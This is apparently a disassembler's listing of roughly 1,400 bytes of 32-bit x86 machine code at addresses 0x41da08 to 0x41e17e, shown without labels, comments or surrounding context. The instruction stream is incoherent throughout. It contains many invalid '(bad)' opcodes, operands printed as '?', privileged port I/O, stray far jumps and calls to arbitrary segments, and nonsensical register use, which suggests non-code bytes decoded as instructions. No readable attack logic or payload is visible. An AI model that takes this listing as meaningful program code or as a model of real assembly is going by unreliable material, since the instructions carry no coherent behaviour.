  41da08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da09:	inc    edx
  41da0a:	pop    edi
  41da0b:	pop    ebx
  41da0c:	fsubrp st(3),st
  41da0e:	mov    bl,0x12
  41da10:	div    DWORD PTR [esi+0xc]
  41da13:	cwde   
  41da14:	test   eax,0x5b507d5
  41da19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da1a:	rcr    BYTE PTR [eax-0x35],cl
  41da1d:	cmp    DWORD PTR es:[edi+ebx*4-0xdc08d89],esp
  41da25:	sub    BYTE PTR [eax],bl
  41da27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da28:	in     al,0xf1
  41da2a:	jp     0x41da78
  41da2c:	adc    ecx,ecx
  41da2e:	nop
  41da2f:	jb     0x41da34
  41da31:	jno    0x41d9d9
  41da33:	inc    ecx
  41da34:	std    
  41da35:	add    bh,bh
  41da37:	imul   bh
  41da39:	jno    0x41da91
  41da3b:	int3   
  41da3c:	mov    DWORD PTR [ebp+ebx*4-0x25],edi
  41da40:	jo     0x41d9f6
  41da42:	cmp    esi,DWORD PTR cs:[ebx+0x8592767]
  41da49:	or     eax,0xec89ee3b
  41da4e:	in     eax,0xce
  41da50:	test   al,0xf6
  41da52:	pcmpeqw mm7,QWORD PTR [eax]
  41da55:	push   edx
  41da56:	jns    0x41daa3
  41da58:	out    dx,al
  41da59:	xor    ebx,DWORD PTR [ecx-0x69]
  41da5c:	daa    
  41da5d:	cli    
  41da5e:	adc    cl,BYTE PTR [eax]
  41da60:	inc    esp
  41da61:	mov    edx,0xbcc1ff6b
  41da66:	sbb    DWORD PTR [edi-0x4e],esp
  41da69:	add    al,0x10
  41da6b:	repnz or ch,BYTE PTR [ecx+0xa01411e]
  41da72:	push   ss
  41da73:	mov    ds:0x62872208,eax
  41da78:	imul   ebp,DWORD PTR [bx+di+0x2],0x44
  41da7d:	fist   WORD PTR [edx]
  41da7f:	push   edi
  41da80:	arpl   bp,sp
  41da82:	inc    esi
  41da83:	adc    DWORD PTR [esi+0x2e166d07],edi
  41da89:	add    eax,0x41011bf6
  41da8e:	(bad)  
  41da8f:	icebp  
  41da90:	aam    0xc2
  41da92:	push   cs
  41da93:	jnp    0x41da19
  41da95:	scas   eax,DWORD PTR es:[edi]
  41da96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da97:	push   cs
  41da98:	xchg   dl,bl
  41da9a:	popf   
  41da9b:	ret    0xad0b
  41da9e:	stc    
  41da9f:	and    edi,DWORD PTR [edx]
  41daa1:	mov    al,ds:0x5e15efe0
  41daa6:	xchg   edi,eax
  41daa7:	ss mov es,ecx
  41daaa:	and    esp,ebp
  41daac:	dec    esp
  41daad:	pushf  
  41daae:	idiv   BYTE PTR [eax-0x22]
  41dab1:	cli    
  41dab2:	sub    DWORD PTR [esi-0x30],edx
  41dab5:	sbb    BYTE PTR [edi+0x6f],al
  41dab8:	xchg   ecx,eax
  41dab9:	(bad)  [eax+0x318ac967]
  41dabf:	fdiv   QWORD PTR [ebx+edx*4]
  41dac2:	adc    DWORD PTR [edx+edi*4-0x2a4162a2],esp
  41dac9:	sahf   
  41daca:	into   
  41dacb:	or     ebp,ebp
  41dacd:	adc    esp,DWORD PTR [ecx+esi*2-0x2f]
  41dad1:	or     BYTE PTR [ecx-0x32],0x74
  41dad5:	rep outs dx,DWORD PTR ds:[esi]
  41dad7:	pop    es
  41dad8:	(bad)  
  41dad9:	fisub  DWORD PTR [ebp+0x1a]
  41dadc:	dec    edx
  41dadd:	sub    bh,0xd8
  41dae0:	dec    eax
  41dae1:	mov    edi,0x8be25786
  41dae6:	out    dx,al
  41dae7:	jb     0x41db64
  41dae9:	sti    
  41daea:	test   eax,0xee7614bc
  41daef:	adc    ecx,ebx
  41daf1:	pop    es
  41daf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daf3:	cmp    BYTE PTR [edi],dl
  41daf5:	inc    edi
  41daf6:	jecxz  0x41db17
  41daf8:	(bad)  
  41daf9:	mov    ecx,0x5e866b14
  41dafe:	sahf   
  41daff:	adc    al,0x73
  41db01:	(bad)  
  41db02:	lods   al,BYTE PTR ds:[esi]
  41db03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db04:	dec    ebx
  41db05:	pusha  
  41db06:	hlt    
  41db07:	stos   BYTE PTR es:[edi],al
  41db08:	aad    0x92
  41db0a:	mov    bl,0xba
  41db0c:	cmp    esi,esi
  41db0e:	(bad)  
  41db0f:	imul   esi,edi,0x58e7eb5a
  41db15:	jae    0x41dae8
  41db17:	pop    ebx
  41db18:	idiv   BYTE PTR [ecx+0x7e]
  41db1b:	lods   eax,DWORD PTR ds:[esi]
  41db1c:	ret    0x6d03
  41db1f:	mov    al,0xe
  41db21:	push   esp
  41db22:	or     ecx,DWORD PTR ds:0x4579be71
  41db28:	test   bl,dh
  41db2a:	call   0x492624a8
  41db2f:	push   cs
  41db30:	fisttp WORD PTR [edx+0x74]
  41db33:	add    DWORD PTR [ebx-0x31fb979e],eax
  41db39:	ds ins BYTE PTR es:[edi],dx
  41db3b:	xchg   ecx,eax
  41db3c:	or     DWORD PTR [ebx+0x71],esi
  41db3f:	sub    DWORD PTR [eax+0x4c],esi
  41db42:	sub    DWORD PTR [esp+ebp*1+0x27],esp
  41db46:	pushf  
  41db47:	xor    DWORD PTR fs:[eax+0x20],eax
  41db4b:	mov    eax,ds:0xbdee0b70
  41db50:	and    eax,0xc3f0b399
  41db55:	ja     0x41dbac
  41db57:	jbe    0x41dbb5
  41db59:	mov    cl,0xf9
  41db5b:	xor    eax,DWORD PTR [ecx+0x65]
  41db5e:	imul   esi,DWORD PTR [ebp+0x1960299],0x37649fba
  41db68:	out    dx,eax
  41db69:	addr16 inc esi
  41db6b:	cmp    ebx,ecx
  41db6d:	pop    ds
  41db6e:	lods   al,BYTE PTR ds:[esi]
  41db6f:	test   bh,al
  41db71:	push   eax
  41db72:	cdq    
  41db73:	dec    edx
  41db74:	adc    DWORD PTR [edi+0x29],edx
  41db77:	dec    edx
  41db78:	add    esi,DWORD PTR [ebp-0x30317e2f]
  41db7e:	shl    ch,1
  41db80:	push   edx
  41db81:	xor    ebp,DWORD PTR [edi-0x5ddff62e]
  41db87:	sub    DWORD PTR [ecx+ebp*2],ebp
  41db8a:	lock jl 0x41db2b
  41db8d:	cmp    esi,DWORD PTR [ebx-0x7fef925e]
  41db93:	aas    
  41db94:	mov    ebp,DWORD PTR [ebp-0x55]
  41db97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db98:	mov    eax,edx
  41db9a:	outs   dx,BYTE PTR ds:[esi]
  41db9b:	add    esi,esi
  41db9d:	dec    ecx
  41db9e:	(bad)  
  41db9f:	ins    DWORD PTR es:[edi],dx
  41dba0:	inc    esi
  41dba1:	jno    0x41dc10
  41dba3:	jg     0x41dbd3
  41dba5:	es cmp eax,0x40f5dec6
  41dbab:	push   0x55
  41dbad:	imul   eax,DWORD PTR [ecx],0x3b
  41dbb0:	add    ebx,DWORD PTR [ecx+eax*4+0x1d]
  41dbb4:	mov    esp,0x5b3dcca9
  41dbb9:	loope  0x41db9f
  41dbbb:	retf   
  41dbbc:	jbe    0x41dc39
  41dbbe:	adc    esp,edi
  41dbc0:	or     ch,BYTE PTR [ebx]
  41dbc2:	dec    edx
  41dbc3:	xchg   ebp,eax
  41dbc4:	fwait
  41dbc5:	inc    eax
  41dbc6:	fist   DWORD PTR [esi-0x41]
  41dbc9:	sbb    ebx,ebp
  41dbcb:	cmp    cl,BYTE PTR [ecx+esi*2]
  41dbce:	inc    edx
  41dbcf:	ficom  WORD PTR [ebx]
  41dbd1:	out    dx,eax
  41dbd2:	inc    esi
  41dbd3:	scas   al,BYTE PTR es:[edi]
  41dbd4:	sahf   
  41dbd5:	ja     0x41dbca
  41dbd7:	fbld   TBYTE PTR cs:[edx+0x3b7ab9e9]
  41dbde:	adc    eax,0xf7408da6
  41dbe3:	das    
  41dbe4:	out    0x8b,eax
  41dbe6:	fstp   QWORD PTR [esi-0x455fc445]
  41dbec:	mov    BYTE PTR [ebp-0x45fd4e26],0x9
  41dbf3:	inc    esi
  41dbf4:	jl     0x41dc04
  41dbf6:	cli    
  41dbf7:	mov    ch,0x7b
  41dbf9:	jmp    0x8c7f:0xbaace01
  41dc00:	mov    al,ds:0x7bcf66f2
  41dc05:	popf   
  41dc06:	fdivr  DWORD PTR [ecx-0x61]
  41dc09:	cmp    BYTE PTR [esi],ah
  41dc0b:	pushf  
  41dc0c:	sbb    bh,BYTE PTR [esi-0xcffd739]
  41dc12:	sbb    dh,0xfe
  41dc15:	xchg   ebx,eax
  41dc16:	and    bh,dh
  41dc18:	inc    esp
  41dc19:	inc    esp
  41dc1a:	jo     0x41dc7f
  41dc1c:	ds test eax,0x39800d6b
  41dc22:	fsub   QWORD PTR [ecx+esi*8]
  41dc25:	sub    eax,0x4e41108b
  41dc2a:	cwde   
  41dc2b:	pop    ecx
  41dc2c:	aaa    
  41dc2d:	sbb    DWORD PTR [edx+0x19512327],esp
  41dc33:	sub    BYTE PTR ds:0xcbc85d06,bh
  41dc39:	add    BYTE PTR ds:0xa3ff97fa,ah
  41dc3f:	and    eax,0xa495e2b9
  41dc44:	adc    esi,DWORD PTR [ecx+0x11ee93e2]
  41dc4a:	aas    
  41dc4b:	inc    ebx
  41dc4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc4d:	shl    BYTE PTR [edi-0x45],0x19
  41dc51:	in     eax,0xad
  41dc53:	xchg   ecx,eax
  41dc54:	push   0x29
  41dc56:	ds inc ebx
  41dc58:	je     0x41dc59
  41dc5a:	sub    eax,0x365159df
  41dc5f:	jge    0x41dca8
  41dc61:	xchg   DWORD PTR [esi+0x40],ebp
  41dc64:	in     eax,dx
  41dc65:	jne    0x41dc9c
  41dc67:	je     0x41dc39
  41dc69:	ror    DWORD PTR ds:0x875a18e,cl
  41dc6f:	sub    dh,BYTE PTR [ebp-0x648bb455]
  41dc75:	retf   
  41dc76:	loop   0x41dc1c
  41dc78:	jge    0x41dc99
  41dc7a:	cmp    al,0xf0
  41dc7c:	or     eax,0x244c6139
  41dc81:	(bad)  
  41dc82:	test   DWORD PTR [edx+0x490f26e1],0x48d1d283
  41dc8c:	xor    ecx,DWORD PTR [edi-0x45]
  41dc8f:	fdiv   QWORD PTR [edi+0x1e]
  41dc92:	inc    esi
  41dc93:	pop    ebx
  41dc94:	add    BYTE PTR [ebx+esi*1],dl
  41dc97:	xor    ebp,DWORD PTR [edx]
  41dc99:	cdq    
  41dc9a:	adc    esp,edi
  41dc9c:	adc    DWORD PTR [edi+0x1c],esp
  41dc9f:	push   es
  41dca0:	and    BYTE PTR [edi],0x5a
  41dca3:	sbb    BYTE PTR [ebp-0x2],cl
  41dca6:	sub    dh,dl
  41dca8:	call   0x6d33:0x4fdb5a51
  41dcaf:	arpl   WORD PTR [edi+0x4be4bef1],si
  41dcb5:	(bad)  
  41dcb6:	addr16 std 
  41dcb8:	pop    ecx
  41dcb9:	push   edx
  41dcba:	add    al,0xb7
  41dcbc:	mov    DWORD PTR ds:0xa4738052,ebx
  41dcc2:	add    BYTE PTR ss:[edx+esi*4-0x484890a6],0xe8
  41dccb:	dec    ebp
  41dccc:	jecxz  0x41dcaf
  41dcce:	inc    esp
  41dccf:	pop    ecx
  41dcd0:	int    0xc
  41dcd2:	or     DWORD PTR [ecx],ebx
  41dcd4:	lods   al,BYTE PTR ds:[esi]
  41dcd5:	pop    edi
  41dcd6:	ret    
  41dcd7:	push   0x5f
  41dcd9:	or     esi,DWORD PTR [edx-0x2200213d]
  41dcdf:	les    esi,FWORD PTR [edi-0x62]
  41dce2:	lahf   
  41dce3:	in     eax,0x88
  41dce5:	repnz mov WORD PTR [ecx],?
  41dce8:	mov    eax,0x2dddb22
  41dced:	lahf   
  41dcee:	rcr    DWORD PTR [eax+0x1f],cl
  41dcf1:	adc    BYTE PTR [ebx+edx*8],dl
  41dcf4:	add    al,0xf4
  41dcf6:	push   edi
  41dcf7:	cli    
  41dcf8:	or     DWORD PTR [eax-0x986a1d7],eax
  41dcfe:	xchg   esp,eax
  41dcff:	imul   esi,esp,0x48b7c72
  41dd05:	mov    edx,0x63c38889
  41dd0a:	mov    bl,0x8d
  41dd0c:	xor    ebx,DWORD PTR [ebp-0x73e22df7]
  41dd12:	std    
  41dd13:	jge    0x41dd93
  41dd15:	cs mov dl,0xc9
  41dd18:	mov    edx,0xbbf64c1d
  41dd1d:	cmp    DWORD PTR [ebx],0x9
  41dd20:	nop
  41dd21:	mov    dl,0x2b
  41dd23:	fist   WORD PTR [edi+0x1c]
  41dd26:	jbe    0x41dd50
  41dd28:	loope  0x41dd6d
  41dd2a:	cs pop ebp
  41dd2c:	call   0x5955f240
  41dd31:	mov    cl,0x6b
  41dd33:	out    dx,eax
  41dd34:	into   
  41dd35:	add    BYTE PTR [ecx],dl
  41dd37:	mov    edi,0x23ee8168
  41dd3c:	mov    dl,0x55
  41dd3e:	xchg   ebp,eax
  41dd3f:	lods   al,BYTE PTR ds:[esi]
  41dd40:	push   es
  41dd41:	xchg   edx,eax
  41dd42:	cmp    BYTE PTR [edx+0x45],dl
  41dd45:	scas   al,BYTE PTR es:[edi]
  41dd46:	lods   eax,DWORD PTR ds:[esi]
  41dd47:	call   0xd3e8:0x74a8426f
  41dd4e:	jbe    0x41dd2d
  41dd50:	icebp  
  41dd51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd52:	adc    esi,DWORD PTR [ecx]
  41dd54:	jb     0x41dd11
  41dd56:	test   al,0x80
  41dd58:	sbb    ebp,eax
  41dd5a:	lahf   
  41dd5b:	retf   0x242a
  41dd5e:	gs mov ebp,0xe6fad2b0
  41dd64:	mov    edx,ecx
  41dd66:	mov    edi,0xcd6fee15
  41dd6b:	stos   BYTE PTR es:[edi],al
  41dd6c:	test   al,0x5a
  41dd6e:	cs inc esp
  41dd70:	add    BYTE PTR [edx],0xcb
  41dd73:	daa    
  41dd74:	jno    0x41dcf6
  41dd76:	mov    ch,0xf6
  41dd78:	les    ecx,FWORD PTR [ebx]
  41dd7a:	popa   
  41dd7b:	hlt    
  41dd7c:	repz or esi,DWORD PTR [eax-0x40]
  41dd80:	jle    0x41dd18
  41dd82:	iret   
  41dd83:	not    BYTE PTR [eax+ebp*1+0x20]
  41dd87:	dec    ebp
  41dd88:	inc    esi
  41dd89:	adc    BYTE PTR [eax+0x77ea6584],bh
  41dd8f:	mov    esi,0x56d8fb3e
  41dd94:	test   DWORD PTR [edx],0xea918ae6
  41dd9a:	jg     0x41ddec
  41dd9c:	loope  0x41dddf
  41dd9e:	mov    bl,0x28
  41dda0:	mov    esp,ebp
  41dda2:	xor    ecx,DWORD PTR [eiz*4+0x4a0ad482]
  41dda9:	jl     0x41dd79
  41ddab:	sub    BYTE PTR [ecx-0x5a],cl
  41ddae:	call   0x2e4c89c1
  41ddb3:	inc    ecx
  41ddb4:	xlat   BYTE PTR ds:[ebx]
  41ddb5:	fsub   st,st(7)
  41ddb7:	fisub  WORD PTR [ebx+0x558c65eb]
  41ddbd:	shl    BYTE PTR [edi+eax*2-0x5e],0xbe
  41ddc2:	lods   al,BYTE PTR ds:[esi]
  41ddc3:	jle    0x41ddfd
  41ddc5:	mov    bl,0x9b
  41ddc7:	mov    ah,0x91
  41ddc9:	xchg   al,ch
  41ddcb:	(bad)  
  41ddcc:	arpl   WORD PTR [ebx-0x67],ax
  41ddcf:	std    
  41ddd0:	dec    BYTE PTR [esi+0x7d]
  41ddd3:	ret    0x4761
  41ddd6:	cmp    al,0xca
  41ddd8:	(bad)  
  41ddd9:	jmp    DWORD PTR [edi+0x66]
  41dddc:	hlt    
  41dddd:	xchg   ecx,eax
  41ddde:	imul   ebx,esp,0x472d16ee
  41dde4:	out    0xb1,al
  41dde6:	pushf  
  41dde7:	into   
  41dde8:	cld    
  41dde9:	into   
  41ddea:	sbb    dh,ch
  41ddec:	sub    al,0xf7
  41ddee:	data16 mov ah,0xdd
  41ddf1:	pop    di
  41ddf3:	arpl   WORD PTR [edi],sp
  41ddf5:	cmp    DWORD PTR [eax-0x53],edi
  41ddf8:	inc    esp
  41ddf9:	xchg   esi,eax
  41ddfa:	mov    ebp,0xac7c3786
  41ddff:	dec    ebx
  41de00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de01:	mov    al,ds:0x37f20b34
  41de06:	pusha  
  41de07:	sbb    al,0xa5
  41de09:	in     al,0xf7
  41de0b:	jmp    edx
  41de0d:	and    eax,0xcdb3c170
  41de12:	out    0xf1,eax
  41de14:	xor    eax,0x41de9cb4
  41de19:	or     ah,BYTE PTR [edx-0x17]
  41de1c:	icebp  
  41de1d:	or     DWORD PTR [edi+edx*8-0x509c7d1a],edx
  41de24:	mov    esp,?
  41de26:	(bad)  
  41de27:	jmp    0xf1d7fd52
  41de2c:	(bad)
  41de2f:	sbb    DWORD PTR [edi+0x328b037f],ebx
  41de35:	push   ss
  41de36:	fs pusha 
  41de38:	push   ebp
  41de39:	push   ebp
  41de3a:	call   0x51b7:0x89815d06
  41de41:	pop    ebp
  41de42:	int3   
  41de43:	push   0x27
  41de45:	daa    
  41de46:	mov    al,BYTE PTR [esi-0x65]
  41de49:	rol    BYTE PTR [ebp-0x106ba7bc],1
  41de4f:	xchg   bl,ah
  41de51:	pop    ss
  41de52:	icebp  
  41de53:	pop    es
  41de54:	pop    es
  41de55:	shr    BYTE PTR [ebx+0x6e],1
  41de58:	adc    eax,0x97a83182
  41de5d:	jmp    0xdc05:0x49da8687
  41de64:	in     al,0xf9
  41de66:	es rcl cl,cl
  41de69:	lgs    esp,FWORD PTR [ecx-0x58a137c6]
  41de70:	rcr    DWORD PTR [ecx-0x35f32b38],1
  41de76:	adc    DWORD PTR [ebx-0x76],edi
  41de79:	xchg   esi,eax
  41de7a:	ss sahf 
  41de7c:	and    DWORD PTR [edx+0x3a],ebx
  41de7f:	leave  
  41de80:	push   ebp
  41de81:	mov    ds:0x2fc510e8,eax
  41de86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de87:	sub    eax,0x8039453e
  41de8c:	dec    ebx
  41de8d:	lock ins BYTE PTR es:[edi],dx
  41de8f:	or     BYTE PTR [esi+0x50],0xab
  41de93:	andnps xmm7,xmm4
  41de96:	frstor ds:0xc48b933c
  41de9c:	retf   
  41de9d:	inc    esi
  41de9e:	cmp    eax,0x20acb866
  41dea3:	sbb    cl,BYTE PTR [edx+0x64]
  41dea6:	sbb    eax,0x35c5677
  41deab:	dec    edx
  41deac:	adc    BYTE PTR [esi],0xd9
  41deaf:	sub    ebp,ebx
  41deb1:	pop    eax
  41deb2:	mov    ebx,0x773f9d65
  41deb7:	iret   
  41deb8:	int3   
  41deb9:	push   ebx
  41deba:	add    eax,0x981c295e
  41debf:	les    ebx,FWORD PTR [ecx+0x6c]
  41dec2:	or     DWORD PTR [ebx],ecx
  41dec4:	xchg   esp,eax
  41dec5:	icebp  
  41dec6:	cs jge 0x41df3f
  41dec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41deca:	sub    bl,ch
  41decc:	inc    edi
  41decd:	add    cl,dl
  41decf:	mov    al,ds:0x45bfcc41
  41ded4:	xor    DWORD PTR [ecx-0x6f5a207a],0x35dc8275
  41dede:	out    dx,eax
  41dedf:	xor    eax,DWORD PTR [edx+eax*1+0xf]
  41dee3:	sbb    al,0xf6
  41dee5:	push   cs
  41dee6:	in     eax,0xab
  41dee8:	xchg   ecx,eax
  41dee9:	cld    
  41deea:	aaa    
  41deeb:	sub    di,si
  41deee:	je     0x41df58
  41def0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41def1:	test   BYTE PTR [esi+0x42],cl
  41def4:	icebp  
  41def5:	icebp  
  41def6:	clc    
  41def7:	add    bl,BYTE PTR [esi+0x4f]
  41defa:	inc    esi
  41defb:	rcl    BYTE PTR [ecx+0x12],0x1e
  41deff:	nop
  41df00:	rol    DWORD PTR [ebx-0xc],1
  41df03:	dec    ebx
  41df04:	mov    cl,0x18
  41df06:	retf   0xf426
  41df09:	sbb    bh,ch
  41df0b:	cdq    
  41df0c:	shr    ah,cl
  41df0e:	adc    ebx,DWORD PTR [ecx-0x27]
  41df11:	inc    DWORD PTR [eax]
  41df13:	push   di
  41df15:	jno    0x41deeb
  41df17:	hlt    
  41df18:	push   ecx
  41df19:	hlt    
  41df1a:	and    al,0x28
  41df1c:	and    BYTE PTR [edi],dh
  41df1e:	scas   al,BYTE PTR es:[edi]
  41df1f:	and    BYTE PTR [ebx+0x7a],cl
  41df22:	sub    eax,0x81b32543
  41df27:	mov    DWORD PTR [esi],ebp
  41df29:	cmp    dl,BYTE PTR [eax]
  41df2b:	fisttp QWORD PTR [ecx+0x4899de29]
  41df31:	fbld   TBYTE PTR [esi]
  41df33:	cmp    al,bl
  41df35:	mov    al,ds:0xf7ce05b
  41df3a:	ja     0x41df05
  41df3c:	dec    esi
  41df3d:	ds retf 
  41df3f:	mov    DWORD PTR [ecx],ebp
  41df41:	jp     0x41df9e
  41df43:	cli    
  41df44:	iret   
  41df45:	jecxz  0x41df41
  41df47:	imul   ecx,DWORD PTR [ebx],0x502507be
  41df4d:	sub    eax,0xaa2ead62
  41df52:	mov    ?,WORD PTR [ebx+0x1eeb6105]
  41df58:	sub    BYTE PTR [eax+0x68a9e0d5],ah
  41df5e:	sbb    eax,0x12a76d4
  41df63:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41df65:	sub    esi,DWORD PTR [edi]
  41df67:	lods   eax,DWORD PTR ds:[esi]
  41df68:	(bad)  
  41df69:	imul   ecx,DWORD PTR [esi+ecx*8],0xee11a9e2
  41df70:	pop    ds
  41df71:	mov    cl,0x84
  41df73:	cmp    bl,BYTE PTR [ebp+0x5573f5d7]
  41df79:	add    BYTE PTR ds:0x2e12fd83,dl
  41df7f:	cmp    al,BYTE PTR [eax-0x7c]
  41df82:	dec    ecx
  41df83:	mov    WORD PTR [edx+0x76],es
  41df86:	jno    0x41dfaa
  41df88:	and    edi,esi
  41df8a:	ja     0x41df59
  41df8c:	and    eax,0xe28ebeb
  41df91:	in     al,dx
  41df92:	mov    esi,0x1d2f2f0
  41df97:	call   0x5161038
  41df9c:	scas   al,BYTE PTR es:[edi]
  41df9d:	test   al,0xbb
  41df9f:	popf   
  41dfa0:	fisttp QWORD PTR [ecx+0x43]
  41dfa3:	mov    ecx,0xbd816189
  41dfa8:	pusha  
  41dfa9:	retf   0x1550
  41dfac:	iret   
  41dfad:	adc    BYTE PTR [eax+0x6d50ca1c],bl
  41dfb3:	or     ah,ch
  41dfb5:	int3   
  41dfb6:	cmp    bh,dh
  41dfb8:	or     al,0x16
  41dfba:	xchg   edx,eax
  41dfbb:	aaa    
  41dfbc:	dec    esp
  41dfbd:	mov    es,WORD PTR [ecx]
  41dfbf:	or     al,BYTE PTR [eax+0x7e]
  41dfc2:	sar    esi,cl
  41dfc4:	push   cs
  41dfc5:	retf   
  41dfc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfc7:	sbb    al,0xd2
  41dfc9:	cmc    
  41dfca:	rcr    BYTE PTR es:[edx+0x13db616b],0xc1
  41dfd2:	fwait
  41dfd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfd4:	jmp    0xcc88:0x6dd43601
  41dfdb:	loopne 0x41dfc6
  41dfdd:	mov    ah,0xd1
  41dfdf:	ja     0x41dfe2
  41dfe1:	xchg   esp,eax
  41dfe2:	int3   
  41dfe3:	mov    edx,eax
  41dfe5:	push   eax
  41dfe6:	imul   ebx,DWORD PTR [esi-0x45c91220],0xffffff9d
  41dfed:	xlat   BYTE PTR ds:[ebx]
  41dfee:	or     al,0xfe
  41dff0:	cmp    DWORD PTR [ebp+0x1c9a051a],esp
  41dff6:	int    0x1b
  41dff8:	ds mov esp,ds
  41dffb:	mov    edx,0x34b2040a
  41e000:	loope  0x41dfeb
  41e002:	adc    BYTE PTR [ecx-0x36],0x4e
  41e006:	pushf  
  41e007:	mov    dh,BYTE PTR [ebp-0x1a]
  41e00a:	mov    bh,0x0
  41e00c:	retf   
  41e00d:	cdq    
  41e00e:	icebp  
  41e00f:	out    dx,eax
  41e010:	mov    ds:0x63105f02,eax
  41e015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e016:	lahf   
  41e017:	jno    0x41dfb6
  41e019:	mov    ebx,0x1d7bffcb
  41e01e:	out    dx,eax
  41e01f:	pop    ss
  41e020:	pop    eax
  41e021:	mov    edx,0x485caa9b
  41e026:	sbb    dh,BYTE PTR [ecx]
  41e028:	pop    ss
  41e029:	jmp    0x41e04f
  41e02b:	stos   DWORD PTR es:[edi],eax
  41e02c:	and    cl,BYTE PTR [edx+0x3982e70d]
  41e032:	or     DWORD PTR [eax-0x346a4ddb],0x92288dc1
  41e03c:	pusha  
  41e03d:	retf   0x2100
  41e040:	xchg   edi,eax
  41e041:	fild   WORD PTR [edi]
  41e043:	hlt    
  41e044:	sbb    al,0xd4
  41e046:	cld    
  41e047:	inc    eax
  41e048:	push   ss
  41e049:	jmp    0x6ede:0x377ac25a
  41e050:	dec    edx
  41e051:	xchg   esp,eax
  41e052:	adc    dh,al
  41e054:	dec    edx
  41e055:	adc    al,BYTE PTR [eax+0x14895140]
  41e05b:	pop    ebx
  41e05c:	add    edx,edx
  41e05e:	or     DWORD PTR [esi],0x70
  41e061:	and    dl,BYTE PTR [ebp+eax*8+0x633395f8]
  41e068:	or     dh,BYTE PTR [esi-0x7ce8ea80]
  41e06e:	aam    0xf6
  41e070:	std    
  41e071:	jmp    0xd8c9:0x2055cae0
  41e078:	adc    DWORD PTR [ecx+0x211dd964],ecx
  41e07e:	repz pop esi
  41e080:	adc    DWORD PTR [eax+0x44],eax
  41e083:	mov    bh,0x47
  41e085:	inc    ebx
  41e086:	pop    ebx
  41e087:	pushf  
  41e088:	imul   edi,DWORD PTR [ebp+0x7e],0xffffffb1
  41e08c:	les    ebp,FWORD PTR [esi-0x4e]
  41e08f:	int3   
  41e090:	mov    dl,0x77
  41e092:	ret    0xe329
  41e095:	and    BYTE PTR [esi],0x75
  41e098:	ins    BYTE PTR es:[edi],dx
  41e099:	xchg   esp,eax
  41e09a:	dec    ebp
  41e09b:	div    edx
  41e09d:	cld    
  41e09e:	cmp    ah,BYTE PTR [eax+0xc95cf0e]
  41e0a4:	(bad)
  41e0a7:	cli    
  41e0a8:	sub    WORD PTR [ecx-0x13a2df66],di
  41e0af:	inc    ecx
  41e0b0:	jo     0x41e091
  41e0b2:	mov    al,0x21
  41e0b4:	aas    
  41e0b5:	inc    edi
  41e0b6:	es retf 0xc6af
  41e0ba:	jmp    0x569d:0x6a2b627
  41e0c1:	(bad)  
  41e0c2:	mov    esi,0x398c7697
  41e0c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0c8:	pop    ss
  41e0c9:	mov    ah,0xe6
  41e0cb:	test   eax,0x76fd4c54
  41e0d0:	inc    ecx
  41e0d1:	pop    ss
  41e0d2:	fs in  eax,dx
  41e0d4:	(bad)  
  41e0d5:	or     BYTE PTR [eax-0xb],cl
  41e0d8:	(bad)  
  41e0d9:	mov    eax,ds:0x28bbb702
  41e0de:	sbb    eax,0xdc33ed70
  41e0e3:	sub    al,BYTE PTR [ecx]
  41e0e5:	mov    eax,ds:0x6213128b
  41e0ea:	add    ebp,DWORD PTR [edi]
  41e0ec:	push   ebp
  41e0ed:	or     BYTE PTR [ecx],bh
  41e0ef:	popf   
  41e0f0:	aad    0x3c
  41e0f2:	and    ah,BYTE PTR [esi+0x5f]
  41e0f5:	mov    dh,0x93
  41e0f7:	sub    eax,0x1230bdae
  41e0fc:	jb     0x41e164
  41e0fe:	xchg   ebx,eax
  41e0ff:	bound  edi,QWORD PTR [ebp+0x4a4f8393]
  41e105:	fwait
  41e106:	dec    eax
  41e107:	sub    eax,0x4760719c
  41e10c:	leave  
  41e10d:	pop    ebp
  41e10e:	je     0x41e116
  41e110:	inc    eax
  41e111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e112:	jl     0x41e0e7
  41e114:	fmul   QWORD PTR [edi+0x2a5ce275]
  41e11a:	xor    eax,0xaf0335b4
  41e11f:	mov    bh,0x59
  41e121:	jmp    0x41e144
  41e123:	xchg   dh,ah
  41e125:	mov    ebp,0xa49d6b1a
  41e12a:	dec    eax
  41e12b:	retf   0xc65b
  41e12e:	into   
  41e12f:	add    eax,0x47
  41e132:	inc    esi
  41e133:	push   ds
  41e134:	call   0x18d:0xf872ed49
  41e13b:	mov    eax,ds:0x5eebd7ef
  41e140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e141:	out    dx,al
  41e142:	mov    ebp,0x1f7257f0
  41e147:	pop    eax
  41e148:	xor    al,0xfe
  41e14a:	test   edi,ebp
  41e14c:	push   ebp
  41e14d:	inc    edi
  41e14e:	es pop edx
  41e150:	and    ebx,esp
  41e152:	jno    0x41e18d
  41e154:	push   esp
  41e155:	push   ebp
  41e156:	clc    
  41e157:	push   cs
  41e158:	cmovnp esi,DWORD PTR [ecx]
  41e15b:	retf   0x184c
  41e15e:	jge    0x41e1a8
  41e160:	in     eax,0x61
  41e162:	sub    bl,dh
  41e164:	mov    edi,0xdce57323
  41e169:	test   eax,0xf611ae85
  41e16e:	pop    ss
  41e16f:	dec    esi
  41e170:	mov    ebx,0xf3f4f644
  41e175:	push   ecx
  41e176:	cs cmp al,0x2e
  41e179:	sub    eax,0x34f43d73
  41e17e:	leave  
